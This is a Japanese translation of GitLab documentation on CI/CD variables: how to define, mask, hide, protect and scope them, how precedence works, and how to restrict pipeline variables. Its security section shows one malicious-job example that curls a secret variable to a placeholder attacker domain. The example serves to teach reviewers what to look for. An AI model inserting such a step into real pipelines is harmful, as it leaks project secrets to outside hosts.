---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments
title: GitLab CI/CD変数
description: 設定、使用方法、セキュリティ。
---

{{< details >}}

- プラン: Free、Premium、Ultimate
- 提供形態: GitLab.com、GitLab Self-Managed、GitLab Dedicated

{{< /details >}}

CI/CD変数は、環境変数の一種です。これらを使用して、以下を実行できます:

- ジョブとパイプラインの動作を制御します。
- [ジョブスクリプト](job_scripts.md)内などで再利用したい値を保存する。
- `.gitlab-ci.yml`ファイルで値をハードコーディングすることを回避する。

変数名は、スクリプトを実行する際に[Runnerが使用するShell](https://docs.gitlab.com/runner/shells/)によって制限されます。各Shellには、予約済みの変数名の独自のセットがあります。

一環した動作を確保するには、変数値を常に単一引用符または二重引用符で囲む必要があります。変数は内部的に[Psych YAMLパーサー](https://docs.ruby-lang.org/en/master/Psych.html)によって解析されるため、引用符で囲まれた変数と引用符で囲まれていない変数は異なる方法で解析される可能性があります。たとえば、`VAR1: 012345`は8進数値として解釈されるため、値は`5349`になりますが、`VAR1: "012345"`は文字列として解析され、値は`012345`になります。

GitLab CI/CDの高度な使用法の詳細については、GitLabエンジニアが共有する[7つの高度なGitLab CIワークフローハック](https://about.gitlab.com/webcast/7cicd-hacks/)を参照してください。

## 定義済みCI/CD変数 {#predefined-cicd-variables}

GitLab CI/CDでは、パイプライン設定およびジョブスクリプトで使用できる[定義済みCI/CD変数](predefined_variables.md)のセットが用意されています。これらの変数には、パイプラインがトリガーされたり実行されたりするときに必要になる可能性のある、ジョブ、パイプライン、およびその他の値に関する情報が含まれています。

定義済みCI/CD変数は、事前に宣言しなくても`.gitlab-ci.yml`で使用できます。例: 

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

この例のスクリプトは、`The job's stage is 'test'`を出力します。

## `.gitlab-ci.yml`ファイルでCI/CD変数を定義する {#define-a-cicd-variable-in-the-gitlab-ciyml-file}

`.gitlab-ci.yml`ファイルでCI/CD変数を作成するには、[`variables`](../yaml/_index.md#variables)キーワードを使用して変数と値を定義します。

`.gitlab-ci.yml`ファイルに保存された変数は、リポジトリへのアクセス権を持つすべてのユーザーに表示されるため、機密性の低いプロジェクト設定のみを保存する必要があります。たとえば、`DATABASE_URL`変数に保存されているデータベースのURLなどです。シークレットやキーなどの値を含む機密性の高い変数は、UIで追加する必要があります。

`variables`は以下で定義できます:

- ジョブ内: 変数は、そのジョブの`script`、`before_script`、または`after_script`セクション、および一部の[ジョブキーワード](../yaml/_index.md#job-keywords)でのみ使用できます。
- `.gitlab-ci.yml`ファイルのトップレベル: 変数はパイプライン内のすべてのジョブのデフォルトとして使用できます。ただし、ジョブが同じ名前の変数を定義する場合は除きます。その場合は、ジョブの変数が優先されます。

どちらの場合も、これらの変数を[グローバルキーワード](../yaml/_index.md#global-keywords)と一緒に使用することはできません。

例: 

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

この例では:

- `job1`の出力: `Variables are 'A default variable' and 'Job 1 variable'`
- `job2`の出力: `Variables are 'Different value than default', 'Job 2 variable', and ''`

`value`および`description`のキーワードを使用して、手動でトリガーされるパイプラインに[事前入力される変数](../pipelines/_index.md#prefill-variables-in-manual-pipelines)を定義します。

### 単一ジョブでデフォルト変数をスキップする {#skip-default-variables-in-a-single-job}

ジョブでデフォルト変数を使用しない場合は、`variables`を`{}`に設定します:

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## UIでCI/CD変数を定義する {#define-a-cicd-variable-in-the-ui}

トークンやパスワードなどの機密性の高い変数は、`.gitlab-ci.yml`ファイルではなく、UIの設定に保存する必要があります。

デフォルトでは、フォークされたプロジェクトからのパイプラインは、親プロジェクトで使用できるCI/CD変数にアクセスできません。[フォークからのマージリクエストに対して親プロジェクトでマージリクエストパイプラインを実行](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)すると、すべての変数がパイプラインで使用可能になります。

### プロジェクトの場合 {#for-a-project}

CI/CD変数をプロジェクトの設定に追加できます。プロジェクトごとに最大8000個のCI/CD変数を設定できます。

前提要件:

- メンテナーロールを持つプロジェクトメンバーである必要があります。

プロジェクトの設定で変数を追加または更新するには、次の手順に従います:

1. 左側のサイドバーで、**検索または移動先**を選択して、プロジェクトを見つけます。[新しいナビゲーションをオン](../../user/interface_redesign.md#turn-new-navigation-on-or-off)にしている場合、このフィールドは上部のバーにあります。
1. **設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. **変数を追加する**を選択し、詳細を入力します:
   - **キー**: 英数字または`_`のみを使用し、スペースを含めず1行で指定する必要があります。
   - **値**: 値は10,000文字に制限されていますが、Runnerのオペレーティングシステムの制限も適用されます。**表示レベル**が**マスクする**または**マスクして非表示**に設定されている場合、値には追加の制限があります。
   - **種類**: `Variable`（デフォルト）または[`File`](#use-file-type-cicd-variables)。
   - **環境スコープ**: オプション。**すべて (デフォルト)** (`*`)、特定の[environment](../environments/_index.md)環境、またはワイルドカード環境スコープ。
   - **変数の保護**: オプション。選択した場合、変数は保護ブランチまたは保護タグで実行されるパイプラインでのみ使用できます。
   - **表示レベル**: **表示**、**マスクする**、または**マスクして非表示**を選択します。
   - **変数参照を展開**: オプション。選択した場合、変数は別の変数を参照できます。**表示レベル**が**マスクする**または**マスクして非表示**に設定されている場合、別の変数を参照することはできません。

または、[API](../../api/project_level_variables.md)を使用してプロジェクト変数を追加することもできます。

### グループの場合 {#for-a-group}

グループ内のすべてのプロジェクトでCI/CD変数を使用可能にできます。グループごとに最大30000個のCI/CD変数を設定できます。

前提要件:

- オーナーロールを持つグループメンバーである必要があります。

グループ変数を追加するには、次の手順に従います:

1. 左側のサイドバーで、**検索または移動先**を選択して、グループを見つけます。[新しいナビゲーションをオン](../../user/interface_redesign.md#turn-new-navigation-on-or-off)にしている場合、このフィールドは上部のバーにあります。
1. **設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. **変数を追加する**を選択し、詳細を入力します:
   - **キー**: 英数字または`_`のみを使用し、スペースを含めず1行で指定する必要があります。
   - **値**: 値は10,000文字に制限されていますが、Runnerのオペレーティングシステムの制限も適用されます。**表示レベル**が**マスクする**または**マスクして非表示**に設定されている場合、値には追加の制限があります。
   - **種類**: `Variable`（デフォルト）または[`File`](#use-file-type-cicd-variables)。
   - **変数の保護**: オプション。選択した場合、変数は保護ブランチまたは保護タグで実行されるパイプラインでのみ使用できます。
   - **表示レベル**: **表示**、**マスクする**、**マスクして非表示**を選択します。
   - **変数参照を展開**: オプション。選択した場合、変数は別の変数を参照できます。**表示レベル**が**マスクする**または**マスクして非表示**に設定されている場合、別の変数を参照することはできません。

プロジェクトで使用できるグループ変数は、プロジェクトの**設定 > CI/CD > 変数**セクションに一覧表示されます。サブグループからの変数は、再帰的に継承されます。

または、[API](../../api/group_level_variables.md)を使用してグループ変数を追加することもできます。

#### 環境範囲 {#environment-scope}

{{< details >}}

- プラン: Premium、Ultimate

{{< /details >}}

特定の環境でのみ使用できるグループレベルのCI/CD変数を設定するには、次の手順に従います:

1. 左側のサイドバーで、**検索または移動先**を選択して、グループを見つけます。[新しいナビゲーションをオン](../../user/interface_redesign.md#turn-new-navigation-on-or-off)にしている場合、このフィールドは上部のバーにあります。
1. **設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. 変数の右側にある**編集**（{{< icon name="pencil" >}}）を選択します。
1. **環境スコープ**で、**すべて (デフォルト)**（`*`）、特定の[環境](../environments/_index.md)、またはワイルドカードの環境スコープを選択します。

### インスタンスの場合 {#for-an-instance}

{{< details >}}

- プラン: Free、Premium、Ultimate
- 提供形態: GitLab Self-Managed、GitLab Dedicated

{{< /details >}}

GitLabインスタンス内のすべてのプロジェクトとグループでCI/CD変数を使用可能にできます。

前提要件:

- インスタンスへの管理者アクセス権が必要です。

インスタンス変数を追加するには、次の手順に従います:

1. 左側のサイドバーの下部で、**管理者**を選択します。[新しいナビゲーションをオン](../../user/interface_redesign.md#turn-new-navigation-on-or-off)にしている場合は、左側のサイドバーの下部にある**管理者**を選択します。
1. **設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. **変数を追加する**を選択し、詳細を入力します:
   - **キー**: 英数字または`_`のみを使用し、スペースを含めず1行で指定する必要があります。
   - **値**: 値は10,000文字に制限されていますが、Runnerのオペレーティングシステムの制限も適用されます。**表示レベル**が**表示**に設定されている場合、他の制限はありません。
   - **種類**：`Variable` (デフォルト) または`File`。
   - **変数の保護**: オプション。選択した場合、変数は保護ブランチまたは保護タグで実行されるパイプラインでのみ使用できます。
   - **表示レベル**: **表示**、**マスクする**、または**マスクして非表示**を選択します。
   - **変数参照を展開**: オプション。選択した場合、変数は別の変数を参照できます。**表示レベル**が**マスクする**または**マスクして非表示**に設定されている場合、別の変数を参照することはできません。

または、[API](../../api/instance_level_ci_variables.md)を使用してインスタンス変数を追加することもできます。

## CI/CD変数のセキュリティ {#cicd-variable-security}

`.gitlab-ci.yml`ファイルにプッシュされたコードは、変数のセキュリティを侵害する可能性があります。変数がジョブログで誤って公開されたり、悪意を持ってサードパーティのサーバーに送信されたりする可能性があります。

次の操作を行う前に、`.gitlab-ci.yml`ファイルに変更を加えるすべてのマージリクエストを確認してください:

- [フォークされたプロジェクトから送信されたマージリクエストに対して親プロジェクトでパイプラインを実行](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)する。
- 変更をマージする。

ファイルを追加したり、パイプラインを実行したりする前に、インポートされたプロジェクトの`.gitlab-ci.yml`ファイルを確認してください。

次の例は、`.gitlab-ci.yml`ファイル内の悪意のあるコードを示しています:

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

`accidental-leak-job`のようなスクリプトを介してシークレットが誤って漏洩するリスクを軽減するために、機密情報を含むすべての変数は、常にジョブログでマスクする必要があります。[変数を保護ブランチと保護タグのみに制限](#protect-a-cicd-variable)することもできます。

または、[シークレットを保存および取得するために、外部シークレット管理プロバイダーに接続](../secrets/_index.md)します。

`malicious-job`のような悪意のあるスクリプトは、レビュープロセス中に発見する必要があります。レビュアーは、このようなコードを見つけた場合、決してパイプラインをトリガーしてはいけません。悪意のあるコードによって、マスクされた変数と保護された変数の両方が漏洩する可能性があるためです。

変数の値は[`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)を使用して暗号化され、データベースに保存されます。このデータは、有効な[secrets file](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost)シークレットファイルでのみ、復号化することができます。

### CI/CD変数をマスクする {#mask-a-cicd-variable}

{{< alert type="warning" >}}

CI/CD変数をマスクしても、悪意のあるユーザーが変数値にアクセスするのを確実に防げるとは限りません。機密情報を保護するには、[外部シークレット](../secrets/_index.md)や[ファイルタイプの変数](#use-file-type-cicd-variables)を使用して、`env`/`printenv`などのコマンドラインインターフェースがシークレット変数を表示しないようにすることを検討してください。

{{< /alert >}}

ジョブログに値が表示されないように、プロジェクト、グループ、またはインスタンスのCI/CD変数をマスクできます。ジョブがマスクされた変数の値を出力すると、その値はジョブログで`[MASKED]`に置き換えられます。場合によっては、`[MASKED]`値の後に`x`文字が続くこともあります。

前提要件:

- [UIでCI/CD変数を追加](#define-a-cicd-variable-in-the-ui)するために必要なのと同じロールまたはアクセスレベルが必要です。

変数をマスクするには、次の手順に従います:

1. グループ、プロジェクト、または**管理者**エリアで、**設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. 保護したい変数の横にある**編集**を選択します。
1. **表示レベル**で、**Mask variable**（変数をマスク）を選択します。
1. （推奨）[**変数参照を展開**](#allow-cicd-variable-expansion)チェックボックスをオフにします。変数の展開が有効になっている場合、変数の値で使用できる非英数字は、`_`、`:`、`@`、`-`、`+`、`.`、`~`、`=`、`/`、および`~`のみです。設定が無効になっている場合、すべての文字を使用できます。
1. **変数を更新**を選択します。

変数の値は、以下である必要があります:

- スペースなしの単一行。
- 8文字以上。
- 既存の定義済みまたはカスタムCI/CD変数の名前と一致しない。

プロセスがわずかに変更された方法で値を出力する場合、値をマスクできません。たとえば、シェルが特殊文字をエスケープするために` \ `を追加すると、値はマスクされません:

- マスクされた変数の値の例：`My[value]`
- この出力はマスクされません：`My\[value\]`

`CI_DEBUG_SERVICES`が有効になっている場合、変数の値が明らかになる可能性があります。詳細については、[サービスコンテナのログ](../services/_index.md#capturing-service-container-logs)を参照してください。

### CI/CD変数を非表示にする {#hide-a-cicd-variable}

{{< history >}}

- GitLab 17.4で`ci_hidden_variables`[フラグ](../../administration/feature_flags/_index.md)とともに[導入](https://gitlab.com/gitlab-org/gitlab/-/issues/29674)されました。デフォルトでは有効になっています。
- GitLab 17.6で[一般提供](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843)になりました。機能フラグ`ci_hidden_variables`は削除されました。

{{< /history >}}

マスキングに加えて、**CI/CD**の設定ページでCI/CD変数の値を表示されないようにすることもできます。変数を非表示にできるのは、新しい変数を作成するときのみです。既存の変数を更新して非表示にすることはできません。

前提要件:

- [UIでCI/CD変数を追加](#define-a-cicd-variable-in-the-ui)するために必要なのと同じロールまたはアクセスレベルが必要です。
- 変数の値が、[マスクされた変数の要件](#mask-a-cicd-variable)を満たしている必要があります。

変数を非表示にするには、[UIで新しいCI/CD変数を追加](#define-a-cicd-variable-in-the-ui)するときに、**表示レベル**セクションで**マスクして非表示**を選択します。変数を保存すると、その変数はCI/CDパイプラインで使用できますが、UIで再度表示することはできません。

### CI/CD変数を保護する {#protect-a-cicd-variable}

[保護ブランチ](../../user/project/repository/branches/protected.md)または[保護タグ](../../user/project/protected_tags.md)で実行されるパイプラインでのみ使用可能になるよう、プロジェクト、グループ、またはインスタンスのCI/CD変数を設定できます。

マージ結果パイプラインとマージリクエストパイプラインは、[必要に応じて保護された変数にアクセスできます](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners)。

前提要件:

- [UIでCI/CD変数を追加](#define-a-cicd-variable-in-the-ui)するために必要なのと同じロールまたはアクセスレベルが必要です。

変数の保護を設定するには、次の手順に従います:

1. プロジェクトまたはグループで、**設定** >**CI/CD**に移動します。
1. **変数**を展開します。
1. 保護したい変数の横にある**編集**を選択します。
1. **変数の保護**チェックボックスをオンにします。
1. **変数を更新**を選択します。

この変数は、後続のすべてのパイプラインで使用できます。

### ファイルタイプのCI/CD変数を使用する {#use-file-type-cicd-variables}

すべての定義済みCI/CD変数と`.gitlab-ci.yml`ファイルで定義された変数は、「変数」タイプ（[APIでは`"variable_type": "env_var"`が](../../api/project_level_variables.md)）です。

変数タイプの変数には次の特徴があります:

- キーと値のペアで構成されます。
- ジョブ内で環境変数として使用でき、その際は次のようになります:
  - CI/CD変数キーは環境変数名として扱われる。
  - CI/CD変数値は環境変数値として扱われる。

プロジェクト、グループ、およびインスタンスのCI/CD変数は、デフォルトでは「変数」種類ですが、必要に応じて「ファイル」種類（APIでは`"variable_type": "file"`）に設定することもできます。ファイルタイプの変数には次の特徴があります:

- キー、値、ファイルで構成されます。
- ジョブ内で環境変数として使用でき、その際は次のようになります:
  - CI/CD変数キーは環境変数名として扱われる。
  - CI/CD変数値は一時ファイルに保存される。
  - その一時ファイルのパスは環境変数値として扱われる。

ファイルを入力として必要とするツールには、ファイルタイプのCI/CD変数を使用します。

たとえば、AWS CLIと`kubectl`はどちらも、設定に`File`種類の変数を使用するツールです。`kubectl`を使用している場合:

- キーが`KUBE_URL`、値が`https://example.com`の変数。
- キーが`KUBE_CA_PEM`、値が証明書のファイルタイプの変数。

この場合、変数を受け付ける`--server`オプションには`KUBE_URL`を渡し、ファイルのパスを受け付ける`--certificate-authority`オプションには`$KUBE_CA_PEM`を渡します:

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### `.gitlab-ci.yml`変数をファイルタイプ変数として使用する {#use-a-gitlab-ciyml-variable-as-a-file-type-variable}

[`.gitlab-ci.yml`ファイルで定義された](#define-a-cicd-variable-in-the-gitlab-ciyml-file)CI/CD変数をファイルタイプ変数として設定することはできません。入力としてファイルパスを必要とするツールで、`.gitlab-ci.yml`で定義された変数を使用したい場合:

- 変数の値をファイルに保存するコマンドを実行します。
- ツールでそのファイルを使用します。

例: 

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## CI/CD変数の展開を防ぐ {#allow-cicd-variable-expansion}

{{< history >}}

- **Expand variable**（変数展開）オプションが、GitLab 16.3で**変数参照を展開**に[名前変更](https://gitlab.com/gitlab-org/gitlab/-/issues/410414)されました。
- GitLab 18.6でデフォルトで無効に[変更](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144)されました。

{{< /history >}}

展開された変数は、`$`文字を含む値を別の変数への参照として扱います。パイプラインの実行時、参照は展開され、参照されている変数の値が使用されます。

UIで定義されたCI/CD変数は、デフォルトでは展開されません。`.gitlab-ci.yml`ファイルで定義されたCI/CD変数の場合、[`variables:expand`キーワード](../yaml/_index.md#variablesexpand)を使用して変数の展開を制御します。

前提要件:

- [UIでCI/CD変数を追加](#define-a-cicd-variable-in-the-ui)するために必要なのと同じロールまたはアクセスレベルが必要です。

変数の変数展開を無効にするには、次の手順に従います:

1. プロジェクトまたはグループで、**設定** >**CI/CD**に移動します。
1. **変数**を展開します。
1. 展開したくない変数の横にある**編集**を選択します。
1. **変数参照を展開**チェックボックスをオンにします。
1. **変数を更新**を選択します。

{{< alert type="note" >}}

変数の展開を使用する場合は、[マスクする](#mask-a-cicd-variable)ことは避けてください。マスクと変数の展開が組み合わされている場合、文字制限により、他の変数を参照するために`$`を使用できません。

{{< /alert >}}

## CI/CD変数の優先順位 {#cicd-variable-precedence}

{{< history >}}

- スキャン実行ポリシー変数の優先順位は、GitLab 16.7で[変更](https://gitlab.com/gitlab-org/gitlab/-/issues/424028)され、`security_policies_variables_precedence`[フラグ](../../administration/feature_flags/_index.md)が導入されました。デフォルトでは有効になっています。[機能フラグは、GitLab 16.8で削除されました](https://gitlab.com/gitlab-org/gitlab/-/issues/435727)。

{{< /history >}}

異なる場所で同じ名前のCI/CD変数を使用できますが、値が相互に上書きされる可能性があります。変数のタイプと定義されている場所によって、どの変数が優先されるかが決まります。

変数の優先順位は次のとおりです（高いものから低いものへ）:

1. [パイプライン実行ポリシー変数](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables)。
1. [スキャン実行ポリシー変数](../../user/application_security/policies/scan_execution_policies.md)。
1. [パイプライン変数](#use-pipeline-variables)。以下の変数の優先順位はすべて同じです:
   - ダウンストリームパイプラインに渡される変数。
   - トリガー変数。
   - スケジュールされたパイプライン変数。
   - 手動パイプライン変数。
   - APIを使用してパイプラインを作成するときに追加された変数。
   - 手動ジョブ変数。
1. プロジェクト変数。
1. グループ変数。グループとそのサブグループに同じ変数名が存在する場合、ジョブは最も近いサブグループの値を使用します。たとえば、`Group > Subgroup 1 > Subgroup 2 > Project`がある場合、`Subgroup 2`で定義された変数が優先されます。
1. インスタンス変数。
1. [`dotenv`レポートからの変数](job_scripts.md#pass-an-environment-variable-to-another-job)。
1. `.gitlab-ci.yml`ファイルのジョブで定義されたジョブ変数。
1. `.gitlab-ci.yml`ファイルのトップレベルで定義された、すべてのジョブのデフォルト変数。
1. [デプロイ変数](predefined_variables.md#deployment-variables)。
1. [定義済み変数](predefined_variables.md)。

例: 

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

この例では、`job1`は`The variable is 'secure'`を出力します。`.gitlab-ci.yml`ファイル内のジョブで定義された変数は、デフォルト変数よりも優先順位が高いためです。

## パイプライン変数を使用する {#use-pipeline-variables}

パイプライン変数とは、新しいパイプラインの実行時に指定する変数です。

{{< alert type="note" >}}

[GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables)以降では、パイプライン変数を渡すのではなく[パイプライン入力](../inputs/_index.md#for-a-pipeline)を使用することが推奨されます。セキュリティの強化のため、入力を使用する場合は[パイプライン変数を無効](#restrict-pipeline-variables)にする必要があります。

{{< /alert >}}

前提要件:

- プロジェクトでデベロッパーロールを持っている必要があります。

次の場合にパイプライン変数を指定できます:

- UIで[パイプラインを手動で実行](../jobs/job_control.md#specify-variables-when-running-manual-jobs)する。
- [スケジュールされたパイプラインを作成](../pipelines/schedules.md#create-a-pipeline-schedule)します。
- [`pipelines` APIエンドポイント](../../api/pipelines.md#create-a-new-pipeline)を使用してパイプラインを作成する。
- [`triggers` APIエンドポイント](../triggers/_index.md#pass-cicd-variables-in-the-api-call)を使用してパイプラインを作成する。
- [プッシュオプション](../../topics/git/commit.md#push-options-for-gitlab-cicd)を使用する。
- [`variables`キーワード](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline) 、[`trigger:forward`キーワード](../yaml/_index.md#triggerforward) 、または[`dotenv`変数](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job)のいずれかを使用して、ダウンストリームパイプラインに変数を渡す。

これらの変数は優先順位が高く、定義済み変数を含め、定義された他の変数をオーバーライドできます。

{{< alert type="warning" >}}

ほとんどの場合、パイプラインが予期しない動作をする可能性があるため、定義済み変数をオーバーライドすることは避けてください。

{{< /alert >}}

### パイプライン変数を制限する {#restrict-pipeline-variables}

{{< history >}}

- GitLab 17.1で[導入](https://gitlab.com/gitlab-org/gitlab/-/issues/440338)されました。
- GitLab.comでは、GitLab 17.7で新しいネームスペースのすべての新しいプロジェクトに対して、`ci_pipeline_variables_minimum_override_role`のデフォルト設定が`no_one_allowed`に[更新](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)されました。

{{< /history >}}

パイプライン変数を使用したパイプラインの実行を、特定のユーザーロールを持つユーザーに制限できます。より低いロールのユーザーがパイプライン変数を使用しようとすると、`Insufficient permissions to set pipeline variables`（パイプライン変数を設定する権限がありません）というエラーメッセージが表示されます。

前提要件:

- プロジェクトでメンテナーロールを持っている必要があります。最小ロールが以前に`owner`または`no_one_allowed`に設定されていた場合は、プロジェクトのオーナーロールを持っている必要があります。

パイプライン変数の使用をメンテナー以上のロールを持つユーザーのみに制限するには、次の手順に従います:

- **設定 > CI/CD > 変数**に移動します。
- **パイプライン変数が使用できる最小ロール**で、次のいずれかを選択します:
  - `no_one_allowed`: パイプライン変数を使用して実行できるパイプラインはありません。GitLab.comでは、新しいネームスペースにおける新しいプロジェクトのデフォルトです。
  - `owner`: オーナーロールを持つユーザーのみが、パイプライン変数を使用してパイプラインを実行できます。この設定をこの値に変更するには、プロジェクトのオーナーロールが必要です。
  - `maintainer`: メンテナーロール以上のユーザーのみが、パイプライン変数を使用してパイプラインを実行できます。GitLab Self-ManagedおよびGitLab Dedicatedで、指定されていない場合のデフォルトです。
  - `developer`: デベロッパーロール以上のユーザーのみが、パイプライン変数を使用してパイプラインを実行できます。

[プロジェクトAPI](../../api/projects.md#edit-a-project)を使用して、`ci_pipeline_variables_minimum_override_role`設定のロールを設定することもできます。

この制限は、プロジェクトまたはグループの設定で定義されたCI/CD変数の使用には影響しません。ほとんどのジョブでは、YAML設定で`variables`キーワードを使用できますが、`trigger`キーワードを使用してダウンストリームパイプラインをトリガーするジョブでは使用できません。トリガージョブは、変数をパイプライン変数としてダウンストリームパイプラインに渡します。この変数の受け渡しも、同じ設定によって制御されます。

#### 複数のプロジェクトに対してパイプライン変数の制限を有効にする {#enable-pipeline-variable-restriction-for-multiple-projects}

{{< history >}}

- GitLab 18.4で[導入](https://gitlab.com/gitlab-org/gitlab/-/issues/514242)されました。

{{< /history >}}

多くのプロジェクトを含むグループの場合、現在使用していないすべてのプロジェクトでパイプライン変数を無効にすることができます。このオプションは、パイプライン変数を使用したことがないプロジェクトに対し、**パイプライン変数が使用できる最小ロール**設定を`no_one_allowed`に設定します。

前提要件:

- グループのオーナーロールを持っている必要があります。

グループ内のプロジェクトでパイプライン変数の制限設定を有効にするには:

1. 左側のサイドバーで、**検索または移動先**を選択して、グループを見つけます。[新しいナビゲーションをオン](../../user/interface_redesign.md#turn-new-navigation-on-or-off)にしている場合、このフィールドは上部のバーにあります。
1. **設定** > **CI/CD**を選択します。
1. **変数**を展開します。
1. **パイプライン変数を使用していないプロジェクトで、パイプライン変数を無効にする**セクションで、**マイグレーションの開始**を選択します。

移行はバックグラウンドで実行されます。移行が完了すると、メール通知が届きます。プロジェクトのメンテナーは、必要に応じて、後で個々のプロジェクトの設定を変更できます。

## 変数をエクスポートする {#exporting-variables}

個別のShellコンテキストで実行されるスクリプトは、エクスポート、エイリアス、ローカル関数定義、またはその他のローカルShellの更新を共有しません。

これは、ジョブが失敗した場合、ユーザー定義スクリプトによって作成された変数がエクスポートされないことを意味します。

Runnerが`.gitlab-ci.yml`で定義されたジョブを実行する場合:

- `before_script`およびmainスクリプトで指定されたスクリプトは、単一のShellコンテキストで一緒に実行され、連結されます。
- `after_script`で指定されたスクリプトは、`before_script`および指定されたスクリプトとは完全に別のShellコンテキストで実行されます。

スクリプトが実行されるShellに関係なく、Runnerの出力には以下が含まれます:

- 定義済み変数。
- 以下で定義された変数:
  - インスタンス、グループ、またはプロジェクトのCI/CD設定。
  - `.gitlab-ci.yml`ファイルの`variables:`セクション。
  - `.gitlab-ci.yml`ファイルの`secrets:`セクション。
  - `config.toml`。

Runnerは、`export MY_VARIABLE=1`のようなスクリプトの本文で実行される手動エクスポート、Shellエイリアス、および関数を処理できません。

たとえば、次の`.gitlab-ci.yml`ファイルでは、次のスクリプトが定義されています:

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

Runnerがこのジョブを実行すると:

1. `before_script`が実行されます:
   1. 出力に表示します。
   1. `MY_VARIABLE`の変数を定義します。
1. `script`が実行されます:
   1. 出力に表示します。
   1. `JOB_DEFINED_VARIABLE`の値を表示します。
   1. `CI_COMMIT_SHA`の値を表示します。
   1. `MY_VARIABLE`の値を表示します。
1. `after_script`は、新しい、別のShellコンテキストで実行されます:
   1. 出力に表示します。
   1. `JOB_DEFINED_VARIABLE`の値を表示します。
   1. `CI_COMMIT_SHA`の値を表示します。
   1. `MY_VARIABLE`の値を空として表示します。これは、`after_script`が`before_script`とは別のShellコンテキストにあるため、変数の値を検出できないからです。

## 関連トピック {#related-topics}

- 実行中のアプリケーションにCI/CD変数を渡すように[Auto DevOps](../../topics/autodevops/_index.md)を設定できます。実行中のアプリケーションのコンテナで、CI/CD変数を環境変数として使用できるようにするには、[変数キーのプレフィックス](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)を`K8S_SECRET_`にします。

- [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck) （GitLabを活用した複雑な設定データ管理への取り組み）動画は、[Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)（複雑な設定データのモノレポ）の実践例プロジェクトをわかりやすく解説したものです。この動画では、複数階層のグループCI/CD変数と環境ごとにスコープされたプロジェクト変数を組み合わせることで、アプリケーションの複雑なビルドやデプロイの設定をどのように実現できるかを説明しています。

  この例は、自分のグループまたはインスタンスにコピーしてテストできます。他のGitLab CIパターンのデモの詳細については、プロジェクトページをご覧ください。

- [CI/CD変数をダウンストリームパイプラインに渡す](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline)ことができます。[`trigger:forward`キーワード](../yaml/_index.md#triggerforward)を使用して、ダウンストリームパイプラインに渡す変数のタイプを指定します。
